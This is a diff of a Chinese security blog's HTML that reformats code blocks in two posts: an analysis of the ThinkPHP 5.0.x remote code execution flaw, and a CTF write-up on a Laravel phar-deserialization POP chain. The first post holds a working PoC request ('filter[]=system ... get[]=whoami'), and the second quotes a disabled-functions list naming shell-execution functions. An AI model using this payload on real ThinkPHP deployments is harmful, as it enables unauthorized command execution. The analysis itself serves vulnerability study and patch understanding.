@@ -115,44 +115,184 @@
 <p><strong>用户请求 -&gt; 路由解析 -&gt; 调度请求 -&gt; 执行操作 -&gt; 响应输出</strong></p>
 <p><img src="https://i.loli.net/2019/01/20/5c43f7bb2d673.png" alt></p>
 <p>App.php代码部分流程如下：  (自己的理解，可能有不对的地方，望斧正<br>1、应用初始化<code>initModule()</code><br>2、run()-&gt;routeCheck()对用户的get请求进行路由检测<br>3、若注册了路由则返回相应的调度值，若路由检测无效(即没有注册路由)则返回调度值为module<br>4、根据调度值，处理不同请求</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">switch (self::$dispatch[&apos;type&apos;]) &#123;</span><br><span class="line">    case &apos;redirect&apos;:</span><br><span class="line">        header(&apos;Location: &apos; . self::$dispatch[&apos;url&apos;], true, self::$dispatch[&apos;status&apos;]);</span><br><span class="line">        break;</span><br><span class="line">        </span><br><span class="line">    case &apos;module&apos;:</span><br><span class="line">       $data = self::module(self::$dispatch[&apos;module&apos;], $config);</span><br><span class="line">        break;</span><br><span class="line">        </span><br><span class="line">    case &apos;controller&apos;:</span><br><span class="line">        $data = Loader::action(self::$dispatch[&apos;controller&apos;], self::$dispatch[&apos;params&apos;]);</span><br><span class="line">        break;</span><br><span class="line">        </span><br><span class="line">    case &apos;method&apos;:</span><br><span class="line">        $data = self::invokeMethod(self::$dispatch[&apos;method&apos;], self::$dispatch[&apos;params&apos;]);</span><br><span class="line">        break;</span><br><span class="line">        </span><br><span class="line">    case &apos;function&apos;:</span><br><span class="line">        $data = self::invokeFunction(self::$dispatch[&apos;function&apos;], self::$dispatch[&apos;params&apos;]);</span><br><span class="line">        break;</span><br><span class="line">        </span><br><span class="line">    default:</span><br><span class="line">        throw new Exception(&apos;dispatch type not support&apos;, 10008);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>switch (self::$dispatch[&#39;type&#39;]) {
+    case &#39;redirect&#39;:
+        header(&#39;Location: &#39; . self::$dispatch[&#39;url&#39;], true, self::$dispatch[&#39;status&#39;]);
+        break;
 
-<p>5、执行处理，返回输出。</p>
+    case &#39;module&#39;:
+       $data = self::module(self::$dispatch[&#39;module&#39;], $config);
+        break;
+
+    case &#39;controller&#39;:
+        $data = Loader::action(self::$dispatch[&#39;controller&#39;], self::$dispatch[&#39;params&#39;]);
+        break;
+
+    case &#39;method&#39;:
+        $data = self::invokeMethod(self::$dispatch[&#39;method&#39;], self::$dispatch[&#39;params&#39;]);
+        break;
+
+    case &#39;function&#39;:
+        $data = self::invokeFunction(self::$dispatch[&#39;function&#39;], self::$dispatch[&#39;params&#39;]);
+        break;
+
+    default:
+        throw new Exception(&#39;dispatch type not support&#39;, 10008);
+}</code></pre><p>5、执行处理，返回输出。</p>
 <p>TP5中get的路由请求参数为s。若get请求时s参数不存在，则调度类型默认值为module，调度方法实现<code>self::module()</code>，即进入MVC的处理方式：Controller层调用Module处理数据返回给View到用户。</p>
 <p>所以核心操作就是调度请求。</p>
 <h1 id="回到正题"><a href="#回到正题" class="headerlink" title="回到正题"></a>回到正题</h1><p>这个漏洞的产生是因为对_method参数过滤不严导致$filter变量覆盖</p>
-<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp/thinkphp_5.0.22_with_extend/public/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br></pre></td></tr></table></figure>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code>http://127.0.0.1/thinkphp/thinkphp_5.0.22_with_extend/public/index.php?s=captcha
 
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>App.php部分代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line">* 执行应用程序</span><br><span class="line">* @access public</span><br><span class="line">* @param  Request $request 请求对象</span><br><span class="line">* @return Response</span><br><span class="line">* @throws Exception</span><br><span class="line">*/</span><br><span class="line">public static function run(Request $request = null)</span><br><span class="line">&#123;</span><br><span class="line">    $request = is_null($request) ? Request::instance() : $request;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        ...</span><br><span class="line">        // 获取应用调度信息</span><br><span class="line">        $dispatch = self::$dispatch;</span><br><span class="line"></span><br><span class="line">        // 未设置调度信息则进行 URL 路由检测</span><br><span class="line">        if (empty($dispatch)) &#123;</span><br><span class="line">            $dispatch = self::routeCheck($request, $config);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        $data = self::exec($dispatch, $config);</span><br><span class="line">    &#125; catch (HttpResponseException $exception) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+POST:
+_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>App.php部分代码：</p>
+<pre><code>&lt;?php
+/**
+* 执行应用程序
+* @access public
+* @param  Request $request 请求对象
+* @return Response
+* @throws Exception
+*/
+public static function run(Request $request = null)
+{
+    $request = is_null($request) ? Request::instance() : $request;
 
-<p>看到<code>$dispatch = self::routeCheck($request, $config)</code>，$request是http请求对象，通过调用Request类中的method方法来获取当前的http请求类型，该函数的实现在<code>thinkphp/library/think/Request.php:512</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line">    * 当前的请求类型</span><br><span class="line">    * @access public</span><br><span class="line">    * @param bool $method  true 获取原始请求类型</span><br><span class="line">    * @return string</span><br><span class="line">    */</span><br><span class="line">public function method($method = false)</span><br><span class="line">&#123;</span><br><span class="line">    if (true === $method) &#123;</span><br><span class="line">        // 获取原始请求类型</span><br><span class="line">        return $this-&gt;server(&apos;REQUEST_METHOD&apos;) ?: &apos;GET&apos;;</span><br><span class="line">    &#125; elseif (!$this-&gt;method) &#123;</span><br><span class="line">        if (isset($_POST[Config::get(&apos;var_method&apos;)])) &#123;</span><br><span class="line">            $this-&gt;method = strtoupper($_POST[Config::get(&apos;var_method&apos;)]);</span><br><span class="line">            $this-&gt;&#123;$this-&gt;method&#125;($_POST);</span><br><span class="line">        &#125; elseif (isset($_SERVER[&apos;HTTP_X_HTTP_METHOD_OVERRIDE&apos;])) &#123;</span><br><span class="line">            $this-&gt;method = strtoupper($_SERVER[&apos;HTTP_X_HTTP_METHOD_OVERRIDE&apos;]);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;method = $this-&gt;server(&apos;REQUEST_METHOD&apos;) ?: &apos;GET&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $this-&gt;method;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    try {
+        ...
+        // 获取应用调度信息
+        $dispatch = self::$dispatch;
 
-<p>var_method的伪装变量值为_method<br><img src="https://i.loli.net/2019/01/20/5c43fee616aac.png" alt></p>
+        // 未设置调度信息则进行 URL 路由检测
+        if (empty($dispatch)) {
+            $dispatch = self::routeCheck($request, $config);
+        }
+        ...
+
+        $data = self::exec($dispatch, $config);
+    } catch (HttpResponseException $exception) {
+        ...
+    }
+    ...
+}</code></pre><p>看到<code>$dispatch = self::routeCheck($request, $config)</code>，$request是http请求对象，通过调用Request类中的method方法来获取当前的http请求类型，该函数的实现在<code>thinkphp/library/think/Request.php:512</code></p>
+<pre><code>&lt;?php
+/**
+    * 当前的请求类型
+    * @access public
+    * @param bool $method  true 获取原始请求类型
+    * @return string
+    */
+public function method($method = false)
+{
+    if (true === $method) {
+        // 获取原始请求类型
+        return $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;
+    } elseif (!$this-&gt;method) {
+        if (isset($_POST[Config::get(&#39;var_method&#39;)])) {
+            $this-&gt;method = strtoupper($_POST[Config::get(&#39;var_method&#39;)]);
+            $this-&gt;{$this-&gt;method}($_POST);
+        } elseif (isset($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;])) {
+            $this-&gt;method = strtoupper($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;]);
+        } else {
+            $this-&gt;method = $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;
+        }
+    }
+    return $this-&gt;method;
+}</code></pre><p>var_method的伪装变量值为_method<br><img src="https://i.loli.net/2019/01/20/5c43fee616aac.png" alt></p>
 <p>因此通过POST一个_method参数，即可进入判断，并执行<code>$this-&gt;{$this-&gt;method}($_POST)</code>语句。因此通过指定_method即可完成对该类的任意方法的调用，其传入对应的参数即对应的$_POST数组。在poc里看到传入的<strong>method为</strong>construct，代码如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">protected function __construct($options = [])</span><br><span class="line">&#123;</span><br><span class="line">    foreach ($options as $name =&gt; $item) &#123;</span><br><span class="line">        if (property_exists($this, $name)) &#123;</span><br><span class="line">            $this-&gt;$name = $item;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (is_null($this-&gt;filter)) &#123;</span><br><span class="line">        $this-&gt;filter = Config::get(&apos;default_filter&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 保存 php://input</span><br><span class="line">    $this-&gt;input = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?php
+protected function __construct($options = [])
+{
+    foreach ($options as $name =&gt; $item) {
+        if (property_exists($this, $name)) {
+            $this-&gt;$name = $item;
+        }
+    }
+    if (is_null($this-&gt;filter)) {
+        $this-&gt;filter = Config::get(&#39;default_filter&#39;);
+    }
 
-<p>利用foreach循环，和POST传入数组即可对Request对象的成员属性进行覆盖。经过覆盖后的结果<br><img src="https://i.loli.net/2019/01/20/5c43f8a3b1ee9.png" alt></p>
+    // 保存 php://input
+    $this-&gt;input = file_get_contents(&#39;php://input&#39;);
+}</code></pre><p>利用foreach循环，和POST传入数组即可对Request对象的成员属性进行覆盖。经过覆盖后的结果<br><img src="https://i.loli.net/2019/01/20/5c43f8a3b1ee9.png" alt></p>
 <p>这里也就解释了poc中为什么要传入method=get。为了使$this-&gt;method=get才能对应上面Request.php的method()方法返回值，否则程序报错</p>
 <p>request对象差不多清楚了，跟进self::routeCheck()</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * URL路由检测（根据PATH_INFO)</span><br><span class="line"> * @access public</span><br><span class="line"> * @param  \think\Request $request 请求实例</span><br><span class="line"> * @param  array          $config  配置信息</span><br><span class="line"> * @return array</span><br><span class="line"> * @throws \think\Exception</span><br><span class="line"> */</span><br><span class="line">public static function routeCheck($request, array $config)</span><br><span class="line">&#123;</span><br><span class="line">    $path   = $request-&gt;path();  //path=captcha</span><br><span class="line">    $depr   = $config[&apos;pathinfo_depr&apos;];</span><br><span class="line">    $result = false;</span><br><span class="line">    </span><br><span class="line">    // 路由检测（根据路由定义返回不同的URL调度）</span><br><span class="line">    $result = Route::check($request, $path, $depr, $config[&apos;url_domain_deploy&apos;]);</span><br><span class="line">        </span><br><span class="line">    return $result;</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?php
+/**
+ * URL路由检测（根据PATH_INFO)
+ * @access public
+ * @param  \think\Request $request 请求实例
+ * @param  array          $config  配置信息
+ * @return array
+ * @throws \think\Exception
+ */
+public static function routeCheck($request, array $config)
+{
+    $path   = $request-&gt;path();  //path=captcha
+    $depr   = $config[&#39;pathinfo_depr&#39;];
+    $result = false;
 
-<p>根据$request的get请求进行路由检测，在vendor/topthink/think-captcha/src/helper.php中captcha注册了路由，因此其对应的URL调度值为method<br><img src="https://i.loli.net/2019/01/20/5c43feb394e5f.png" alt></p>
+    // 路由检测（根据路由定义返回不同的URL调度）
+    $result = Route::check($request, $path, $depr, $config[&#39;url_domain_deploy&#39;]);
+
+    return $result;</code></pre><p>根据$request的get请求进行路由检测，在vendor/topthink/think-captcha/src/helper.php中captcha注册了路由，因此其对应的URL调度值为method<br><img src="https://i.loli.net/2019/01/20/5c43feb394e5f.png" alt></p>
 <p>再返回App.php继续执行<code>$data = self::exec($dispatch, $config);</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">protected static function exec($dispatch, $config)</span><br><span class="line">&#123;</span><br><span class="line">    switch ($dispatch[&apos;type&apos;]) &#123;</span><br><span class="line">        ...</span><br><span class="line">        case &apos;method&apos;: // 回调方法</span><br><span class="line">            $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&apos;var&apos;]);</span><br><span class="line">            $data = self::invokeMethod($dispatch[&apos;method&apos;], $vars);</span><br><span class="line">            break;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>介绍的，根据调度值的不同处理不同请求，此时我们的dispatch为method。继续跟进<code>Request::instance()-&gt;param()</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">public function param($name = &apos;&apos;, $default = null, $filter = &apos;&apos;)</span><br><span class="line">&#123;</span><br><span class="line">    if (empty($this-&gt;mergeParam)) &#123;</span><br><span class="line">        $method = $this-&gt;method(true);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    // 当前请求参数和URL地址中的参数合并</span><br><span class="line">    $this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));</span><br><span class="line">    $this-&gt;mergeParam = true;</span><br><span class="line">    ...</span><br><span class="line">    return $this-&gt;input($this-&gt;param, $name, $default, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>array_merge用来合并参数，此时$this-&gt;param为一个数组，且第一个值为我们刚才覆盖的get值<br><img src="https://i.loli.net/2019/01/20/5c43f82e8ae5b.png" alt></p>
+<pre><code>&lt;?php
+protected static function exec($dispatch, $config)
+{
+    switch ($dispatch[&#39;type&#39;]) {
+        ...
+        case &#39;method&#39;: // 回调方法
+            $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);
+            $data = self::invokeMethod($dispatch[&#39;method&#39;], $vars);
+            break;
+        ...
+    }
+    return $data;
+}</code></pre><p>介绍的，根据调度值的不同处理不同请求，此时我们的dispatch为method。继续跟进<code>Request::instance()-&gt;param()</code></p>
+<pre><code>&lt;?php
+public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
+{
+    if (empty($this-&gt;mergeParam)) {
+        $method = $this-&gt;method(true);
+        ...
+    }
+    ...
+    // 当前请求参数和URL地址中的参数合并
+    $this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));
+    $this-&gt;mergeParam = true;
+    ...
+    return $this-&gt;input($this-&gt;param, $name, $default, $filter);
+}</code></pre><p>array_merge用来合并参数，此时$this-&gt;param为一个数组，且第一个值为我们刚才覆盖的get值<br><img src="https://i.loli.net/2019/01/20/5c43f82e8ae5b.png" alt></p>
 <p>继续跟进<code>$this-&gt;input($this-&gt;param, $name, $default, $filter)</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">public function input($data = [], $name = &apos;&apos;, $default = null, $filter = &apos;&apos;)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    // 解析过滤器</span><br><span class="line">    $filter = $this-&gt;getFilter($filter, $default);</span><br><span class="line">    if (is_array($data)) &#123;</span><br><span class="line">        array_walk_recursive($data, [$this, &apos;filterValue&apos;], $filter);</span><br><span class="line">        reset($data);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?php
+public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
+{
+    ...
+    // 解析过滤器
+    $filter = $this-&gt;getFilter($filter, $default);
+    if (is_array($data)) {
+        array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);
+        reset($data);
+    }
+    ...
+}</code></pre><p>跟进getFilter</p>
+<pre><code>protected function getFilter($filter, $default)
+{
+    if (is_null($filter)) {
+        $filter = [];
+    } else {
+        $filter = $filter ?: $this-&gt;filter;
+        if (is_string($filter) &amp;&amp; false === strpos($filter, &#39;/&#39;)) {
+            $filter = explode(&#39;,&#39;, $filter);
+        } else {
+            $filter = (array) $filter;
+        }
+    }
 
-<p>跟进getFilter</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">protected function getFilter($filter, $default)</span><br><span class="line">&#123;</span><br><span class="line">    if (is_null($filter)) &#123;</span><br><span class="line">        $filter = [];</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $filter = $filter ?: $this-&gt;filter;</span><br><span class="line">        if (is_string($filter) &amp;&amp; false === strpos($filter, &apos;/&apos;)) &#123;</span><br><span class="line">            $filter = explode(&apos;,&apos;, $filter);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $filter = (array) $filter;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filter[] = $default;</span><br><span class="line">    return $filter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>到这逻辑就很清楚了，在input函数里面获得$filter值为我们之前覆盖的$this-&gt;filter，$data是实参传入的$this-&gt;param数组，接着调用 array_walk_recursive()进行自定义函数处理，函数名为filterValue()<br><img src="https://i.loli.net/2019/01/20/5c43f84376fdb.png" alt></p>
+    $filter[] = $default;
+    return $filter;
+}</code></pre><p>到这逻辑就很清楚了，在input函数里面获得$filter值为我们之前覆盖的$this-&gt;filter，$data是实参传入的$this-&gt;param数组，接着调用 array_walk_recursive()进行自定义函数处理，函数名为filterValue()<br><img src="https://i.loli.net/2019/01/20/5c43f84376fdb.png" alt></p>
 <p>从而调用call_user_func进行RCE</p>
 <h1 id="官方补丁"><a href="#官方补丁" class="headerlink" title="官方补丁"></a>官方补丁</h1><p>看一下diff<br><img src="https://i.loli.net/2019/01/20/5c43f86c5eec1.png" alt></p>
 <p>触发漏洞点就是method可控，进而调用任意函数。补丁对参数method进行了白名单</p>
@@ -167,7 +307,7 @@
             </div>
             <div class="continue">
             <a href="/2019/01/20/ThinkPHP5.0.0~5.0.23RCE漏洞分析/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -198,59 +338,141 @@
 <p>题目地址：<a href="https://code-breaking.com/puzzle/7/" target="_blank" rel="noopener">https://code-breaking.com/puzzle/7/</a></p>
 <h1 id="前期"><a href="#前期" class="headerlink" title="前期"></a>前期</h1><p>一个ueditor的页面</p>
 <p>在App\Http\Controllers的EditorController.php里提供了远程下载功能</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private function download($url)</span><br><span class="line">&#123;</span><br><span class="line">    $content = file_get_contents($url);</span><br></pre></td></tr></table></figure>
-
-<p>url可控为以GET形式传入的source值，由于禁止了以下函数，所以只能利用Phar反序列化再打通pop链</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_log</span><br></pre></td></tr></table></figure>
-
-<h1 id="Searching-POP-chain"><a href="#Searching-POP-chain" class="headerlink" title="Searching POP chain"></a>Searching POP chain</h1><p>因为phar反序列化不会反序列化类中的具体函数，所以要找两个魔法方法入口：<code>__destruct|__wakeup</code>这点在柠檬师傅的博客园看到的，也算是经验之谈了。</p>
+<pre><code>private function download($url)
+{
+    $content = file_get_contents($url);</code></pre><p>url可控为以GET形式传入的source值，由于禁止了以下函数，所以只能利用Phar反序列化再打通pop链</p>
+<pre><code>system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_log</code></pre><h1 id="Searching-POP-chain"><a href="#Searching-POP-chain" class="headerlink" title="Searching POP chain"></a>Searching POP chain</h1><p>因为phar反序列化不会反序列化类中的具体函数，所以要找两个魔法方法入口：<code>__destruct|__wakeup</code>这点在柠檬师傅的博客园看到的，也算是经验之谈了。</p>
 <p>首先在namespace Illuminate\Broadcasting里找到PendingBroadcast类存在destruct</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class PendingBroadcast</span><br><span class="line">&#123;   </span><br><span class="line">public function __construct(Dispatcher $events, $event)</span><br><span class="line">&#123;</span><br><span class="line">    $this-&gt;event = $event;</span><br><span class="line">    $this-&gt;events = $events;</span><br><span class="line">&#125;</span><br><span class="line">public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;events-&gt;dispatch($this-&gt;event);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>Dispatcher是一个接口，所以这里$event、$events应该都是一个继承于这个接口的obj。但是看了下，一共就只有两个类继承于Dispatcher(BusFake、EventFake)，且都无法利用。所以转向去寻找存在__call方法的类，看是否可以利用。</p>
+<pre><code>class PendingBroadcast
+{   
+public function __construct(Dispatcher $events, $event)
+{
+    $this-&gt;event = $event;
+    $this-&gt;events = $events;
+}
+public function __destruct()
+    {
+        $this-&gt;events-&gt;dispatch($this-&gt;event);
+    }
+}</code></pre><p>Dispatcher是一个接口，所以这里$event、$events应该都是一个继承于这个接口的obj。但是看了下，一共就只有两个类继承于Dispatcher(BusFake、EventFake)，且都无法利用。所以转向去寻找存在__call方法的类，看是否可以利用。</p>
 <p>为什么要找存在_call方法的类的？根据PHP文档，当一个类里没有定义的方法时，在执行这个不存在方法时，它就会自动调用该类里的__call方法来实现方法重载。</p>
 <p>所以要找一个有_call方法的类–&gt;类ValidGenerator。</p>
-<h1 id="ValidGenerator"><a href="#ValidGenerator" class="headerlink" title="ValidGenerator"></a>ValidGenerator</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public function __call($name, $arguments)</span><br><span class="line">&#123;</span><br><span class="line">    $i = 0;</span><br><span class="line">    do &#123;</span><br><span class="line">        $res = call_user_func_array(array($this-&gt;generator, $name), $arguments);</span><br><span class="line">        $i++;</span><br><span class="line">        if ($i &gt; $this-&gt;maxRetries) &#123;</span><br><span class="line">            throw new \OverflowException(sprintf(&apos;Maximum retries of %d reached without finding a valid value&apos;, $this-&gt;maxRetries));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; while (!call_user_func($this-&gt;validator, $res));</span><br><span class="line"></span><br><span class="line">    return $res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="ValidGenerator"><a href="#ValidGenerator" class="headerlink" title="ValidGenerator"></a>ValidGenerator</h1><pre><code>public function __call($name, $arguments)
+{
+    $i = 0;
+    do {
+        $res = call_user_func_array(array($this-&gt;generator, $name), $arguments);
+        $i++;
+        if ($i &gt; $this-&gt;maxRetries) {
+            throw new \OverflowException(sprintf(&#39;Maximum retries of %d reached without finding a valid value&#39;, $this-&gt;maxRetries));
+        }
+    } while (!call_user_func($this-&gt;validator, $res));
 
-<p>$name的值就是dispatch。如果我们能控制$res，就相当于能控制call_user_func的函数和参数</p>
+    return $res;
+}</code></pre><p>$name的值就是dispatch。如果我们能控制$res，就相当于能控制call_user_func的函数和参数</p>
 <p>由于在call_user_func_array()中，Generator类没有定义dispatch函数，所以又会调用Generator类的_call函数，跟进Generator类</p>
-<h1 id="Generator类"><a href="#Generator类" class="headerlink" title="Generator类"></a>Generator类</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __call($method, $attributes) </span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;format($method, $attributes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>继续跟进format方法</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function format($formatter, $arguments = array())</span><br><span class="line">&#123;</span><br><span class="line">    return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>$formatter的值不可控，且初值为dispatch，继续跟进getFormatter()</p>
